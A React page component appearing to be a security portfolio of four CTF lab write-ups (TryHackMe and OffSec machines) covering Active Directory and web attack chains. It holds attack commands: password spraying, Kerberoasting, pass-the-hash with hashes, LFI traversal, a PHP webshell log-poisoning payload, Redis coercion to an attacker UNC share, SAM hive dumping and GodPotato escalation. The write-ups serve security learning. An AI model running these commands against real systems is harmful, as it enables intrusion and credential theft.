import { FlaskConical } from 'lucide-react';

type Writeup = {
  title: string;
  source: string;
  difficulty: string;
  summary: string;
  tags: string[];
  body: React.ReactNode;
};

function MetaPill({ children }: { children: React.ReactNode }) {
  return (
    <span className='bg-dark-gray-4 border-border-color text-light-gray-3 inline-flex items-center rounded-full border px-3 py-1 text-xs font-semibold uppercase tracking-wide'>
      {children}
    </span>
  );
}

function CodeBlock({ children }: { children: string }) {
  return (
    <pre className='bg-very-dark-gray border-dark-gray-3 overflow-x-auto rounded-xl border p-4 text-[13px] leading-6 text-slate-200'>
      <code>{children}</code>
    </pre>
  );
}

function WriteupCard({ writeup }: { writeup: Writeup }) {
  return (
    <article className='bg-very-dark-gray border-dark-gray-3 flex h-full flex-col gap-6 rounded-2xl border p-6'>
      <header className='space-y-4'>
        <div className='flex flex-wrap items-center gap-2'>
          <MetaPill>{writeup.source}</MetaPill>
          <MetaPill>{writeup.difficulty}</MetaPill>
          {writeup.tags.map((tag) => (
            <MetaPill key={tag}>{tag}</MetaPill>
          ))}
        </div>
        <div className='space-y-2'>
          <h2 className='text-2xl font-bold text-white'>{writeup.title}</h2>
          <p className='text-light-gray-2 text-[15px] leading-7'>{writeup.summary}</p>
        </div>
      </header>
      <div className='space-y-6'>{writeup.body}</div>
    </article>
  );
}

const writeups: Writeup[] = [
  {
    title: 'SoupDecode',
    source: 'TryHackMe',
    difficulty: 'Intermediate',
    summary:
      'An Active Directory room that starts with SMB enumeration and ends with a domain compromise through Kerberoasting, share exposure, and pass-the-hash authentication.',
    tags: ['Active Directory', 'SMB', 'Kerberos'],
    body: (
      <>
        <section className='space-y-3'>
          <h3 className='text-lg font-semibold text-white'>Reconnaissance</h3>
          <p className='text-light-gray-2 text-[15px] leading-7'>
            The first useful signal was the service mix: DNS, Kerberos, LDAP, SMB, and RPC
            together indicated a domain controller. That changed the workflow immediately from
            generic Windows enumeration to AD-focused assessment. The LDAP banner confirmed the
            domain name, and adding the host to `/etc/hosts` made the rest of the tooling more
            reliable.
          </p>
          <CodeBlock>{`nmap -sC -sV 10.49.167.13 -oA nmap/soupedecode_01`}</CodeBlock>
          <p className='text-light-gray-2 text-[15px] leading-7'>
            Null and guest access were both worth testing early. Guest authentication succeeded,
            which made SMB share enumeration and IPC$ testing possible. That opened the path to RID
            brute forcing and a clean username list.
          </p>
        </section>

        <section className='space-y-3'>
          <h3 className='text-lg font-semibold text-white'>Credential Discovery</h3>
          <p className='text-light-gray-2 text-[15px] leading-7'>
            RID brute forcing produced a list of valid users, but AS-REP roasting did not return
            anything useful. The next low-friction option was password spraying with the usernames
            themselves. That found a working pair quickly and gave access to SMB and Kerberos as a
            standard domain user.
          </p>
          <CodeBlock>{`nxc smb 10.49.167.13 -u users.txt -p users.txt --no-brute --continue-on-success
impacket-GetNPUsers SOUPEDECODE.LOCAL/ -dc-ip 10.49.167.13 -usersfile users.txt
impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 10.49.167.13 -request`}</CodeBlock>
          <p className='text-light-gray-2 text-[15px] leading-7'>
            Kerberoasting surfaced several service accounts. One of them cracked with a common
            password, which in turn exposed a backup share containing machine account hashes.
            That single file was the turning point in the room.
          </p>
        </section>

        <section className='space-y-3'>
          <h3 className='text-lg font-semibold text-white'>Privilege Escalation</h3>
          <p className='text-light-gray-2 text-[15px] leading-7'>
            The backup share contained a text file with NTLM hashes for machine accounts. Rather
            than cracking them, the better move was to use pass-the-hash directly. One machine
            account had sufficient rights to authenticate with administrative privileges over SMB,
            which led to remote code execution with Impacket PsExec.
          </p>
          <CodeBlock>{`impacket-psexec SOUPEDECODE.LOCAL/'FileServer$'@10.49.167.13 -hashes :e41da7e79a4c76dbd9cf79d1cb325559`}</CodeBlock>
          <p className='text-light-gray-2 text-[15px] leading-7'>
            From there, the root and user flags were both straightforward to retrieve. The room is a
            good reminder that a chain of modest misconfigurations can become full domain
            compromise without any exploit code at all.
          </p>
        </section>
      </>
    ),
  },
  {
    title: 'Slort',
    source: 'OffSec',
    difficulty: 'Intermediate',
    summary:
      'A Windows XAMPP target where LFI, RFI, and log poisoning lead to code execution, followed by a scheduled task binary hijack for privilege escalation.',
    tags: ['XAMPP', 'LFI', 'RCE'],
    body: (
      <>
        <section className='space-y-3'>
          <h3 className='text-lg font-semibold text-white'>Web Enumeration</h3>
          <p className='text-light-gray-2 text-[15px] leading-7'>
            The application exposed multiple HTTP ports, both serving the same XAMPP-backed site.
            A directory scan identified a page parameter that used `include()`, which made it a
            candidate for local file inclusion. The first error response was useful because it
            revealed the exact document root and confirmed the host was Windows.
          </p>
          <CodeBlock>{`curl -i "http://target/site/index.php?page=main.php"
curl -i "http://target/site/index.php?page=../../../../windows/win.ini"`}</CodeBlock>
          <p className='text-light-gray-2 text-[15px] leading-7'>
            Once the document root was known, traversal depth could be calculated precisely instead
            of guessed. That made the Apache log path easy to derive and turned log poisoning into a
            viable path to execution.
          </p>
        </section>

        <section className='space-y-3'>
          <h3 className='text-lg font-semibold text-white'>Foothold</h3>
          <p className='text-light-gray-2 text-[15px] leading-7'>
            RFI was confirmed, which allowed a two-stage payload: first download a native Windows
            executable, then execute it from disk. When direct RFI is not available, the fallback is
            Apache log poisoning followed by including the access log through the same vulnerable
            parameter.
          </p>
          <CodeBlock>{`curl -A "<?php system($_GET['cmd']); ?>" http://target:8080/
curl "http://target/site/index.php?page=../../apache/logs/access.log&cmd=whoami"`}</CodeBlock>
          <p className='text-light-gray-2 text-[15px] leading-7'>
            The resulting shell ran as the web application user. From there, the shell was upgraded
            and the environment was inspected for writable paths, scheduled jobs, and binaries that
            executed with higher privileges.
          </p>
        </section>

        <section className='space-y-3'>
          <h3 className='text-lg font-semibold text-white'>Privilege Escalation</h3>
          <p className='text-light-gray-2 text-[15px] leading-7'>
            The decisive finding was a scheduled task that executed a writable binary from a backup
            directory. Replacing that binary with a payload allowed the task to run the attacker’s
            code as SYSTEM at the next interval. This is a classic binary hijack pattern: if the
            task is trusted to run a file and the file is writable, the task becomes the execution
            primitive.
          </p>
          <CodeBlock>{`icacls C:\\Backup\\TFTP.EXE
schtasks /query /fo LIST /v | findstr /i "tftp"`}</CodeBlock>
        </section>
      </>
    ),
  },
  {
    title: 'Hokkaido',
    source: 'OffSec',
    difficulty: 'Medium',
    summary:
      'An Active Directory attack chain built from anonymous LDAP access, password reuse in NETLOGON, MSSQL impersonation, targeted Kerberoasting, and LAPS-assisted privilege escalation.',
    tags: ['Active Directory', 'MSSQL', 'LAPS'],
    body: (
      <>
        <section className='space-y-3'>
          <h3 className='text-lg font-semibold text-white'>Initial Access Path</h3>
          <p className='text-light-gray-2 text-[15px] leading-7'>
            The host fingerprint matched a domain controller immediately. Anonymous LDAP and SMB
            enumeration returned enough information to build a first username list, and the NETLOGON
            share contained a password reset note that exposed an initial password for the `info`
            account.
          </p>
          <CodeBlock>{`nxc smb 192.168.220.40 -u 'info' -p 'info' --shares
smbclient -U 'info' //192.168.220.40/NETLOGON`}</CodeBlock>
          <p className='text-light-gray-2 text-[15px] leading-7'>
            That credential opened SMB, MSSQL, and the user home shares. A quick pass through the
            accessible data showed the `homes` share was readable and writable, which made it worth
            checking for stored notes and application artifacts.
          </p>
        </section>

        <section className='space-y-3'>
          <h3 className='text-lg font-semibold text-white'>MSSQL and AD Abuse</h3>
          <p className='text-light-gray-2 text-[15px] leading-7'>
            MSSQL allowed login as `discovery`, and the server supported impersonation. That led to
            a switch into `hrappdb-reader`, then a query against a table that stored service
            account credentials. Once `hrapp-service` was recovered, BloodHound collection became
            worthwhile because service accounts often carry domain ACLs that are not obvious from
            login alone.
          </p>
          <CodeBlock>{`mssqlclient.py hokkaido-aerospace.com/discovery:Start123!@192.168.220.40 -windows-auth
EXECUTE AS LOGIN = 'hrappdb-reader';
use hrappdb
select * from sysauth;`}</CodeBlock>
          <p className='text-light-gray-2 text-[15px] leading-7'>
            BloodHound showed a clean ACL chain: `hrapp-service` could influence `Hazel.Green`,
            `Hazel.Green` could reset `Molly.Smith`, and `Molly.Smith` carried `SeBackupPrivilege`.
            That sequence was shorter and more reliable than trying to force direct shell access
            earlier in the chain.
          </p>
        </section>

        <section className='space-y-3'>
          <h3 className='text-lg font-semibold text-white'>Final Escalation</h3>
          <p className='text-light-gray-2 text-[15px] leading-7'>
            Targeted Kerberoasting exposed `Hazel.Green`, which cracked to a usable password. From
            there the password reset against `Molly.Smith` was straightforward. Once `Molly.Smith`
            was available, the rest of the work was about data handling: dump the SAM and SYSTEM
            hives, extract the local administrator hash, and use pass-the-hash to reach an admin
            shell.
          </p>
          <CodeBlock>{`reg save hklm\\sam C:\\Temp\\sam
reg save hklm\\system C:\\Temp\\system
secretsdump.py -sam sam.sav -system system.sav local
evil-winrm -i hokkaido-aerospace.com -u administrator -H d752482897d54e239376fddb2a2109e4`}</CodeBlock>
        </section>
      </>
    ),
  },
  {
    title: 'Vulnnet Active',
    source: 'TryHackMe',
    difficulty: 'Medium',
    summary:
      'A Windows domain controller where Redis can be coerced into outbound SMB authentication, leading to credential capture, share abuse, and SYSTEM through GodPotato.',
    tags: ['Redis', 'NTLMv2', 'Potato'],
    body: (
      <>
        <section className='space-y-3'>
          <h3 className='text-lg font-semibold text-white'>Coercion and Credential Capture</h3>
          <p className='text-light-gray-2 text-[15px] leading-7'>
            The important signal on this host was Redis running on a domain controller. Redis was
            not the final goal; it was a coercion primitive. By redirecting Redis to a UNC path
            under attacker control, the service attempted outbound SMB authentication and exposed a
            NetNTLMv2 hash that could be cracked offline.
          </p>
          <CodeBlock>{`redis-cli -h 10.10.161.36
CONFIG SET dir \\\\ATTACKER\\share
CONFIG SET dbfilename test.rdb
SAVE`}</CodeBlock>
          <p className='text-light-gray-2 text-[15px] leading-7'>
            The cracked password opened SMB shares. One writable share contained a PowerShell script
            that was executed on a schedule. Replacing the script with a controlled payload turned
            the share write into a code execution path.
          </p>
        </section>

        <section className='space-y-3'>
          <h3 className='text-lg font-semibold text-white'>User Foothold</h3>
          <p className='text-light-gray-2 text-[15px] leading-7'>
            Once the scheduled script was modified, the task executed it as the service account and
            returned a shell. That shell was enough to verify the account’s privileges and confirm
            that `SeImpersonatePrivilege` was available, which is the key prerequisite for the
            Potato family of privilege escalation attacks.
          </p>
          <CodeBlock>{`whoami /priv
whoami /groups
icacls C:\\Shares\\Enterprise-Share\\PurgeIrrelevantData_1826.ps1`}</CodeBlock>
        </section>

        <section className='space-y-3'>
          <h3 className='text-lg font-semibold text-white'>Privilege Escalation</h3>
          <p className='text-light-gray-2 text-[15px] leading-7'>
            With `SeImpersonatePrivilege` confirmed, GodPotato became the cleanest path to SYSTEM.
            The exploit was used with a native Windows command payload so the resulting process
            inherited elevated privileges and returned an administrative shell. That final shell
            made both the user and root-style flags trivial to retrieve.
          </p>
          <CodeBlock>{`GodPotato-NET4.exe -cmd "cmd /c whoami"
GodPotato-NET4.exe -cmd "cmd /c powershell -e <base64>"`}</CodeBlock>
        </section>
      </>
    ),
  },
];

export default function LabWriteupsPage() {
  return (
    <main className='relative flex h-min w-full flex-1 flex-col flex-nowrap items-center justify-start overflow-hidden p-0'>
      <section className='relative flex h-min w-full max-w-full flex-none flex-col flex-nowrap items-start justify-center gap-6 overflow-visible p-[80px_0px] sm:px-5 lg:w-[80%] lg:max-w-[980px] lg:px-0'>
        <div className='border-dark-gray-4 flex w-full items-center gap-3 border-b border-dashed pb-6'>
          <div className='bg-dark-gray-3 border-border-color flex h-11 w-11 items-center justify-center rounded-lg border'>
            <FlaskConical
              className='text-light-gray-3'
              size={24}
            />
          </div>
          <div>
            <h1 className='text-2xl font-bold text-white'>Lab Writeups</h1>
            <p className='text-light-gray-2 text-[15px] font-medium'>
              Clean, publication-style notes for selected lab machines and practice environments.
            </p>
          </div>
        </div>

        <div className='grid w-full grid-cols-1 gap-5'>
          {writeups.map((writeup) => (
            <WriteupCard
              key={writeup.title}
              writeup={writeup}
            />
          ))}
        </div>
      </section>
    </main>
  );
}
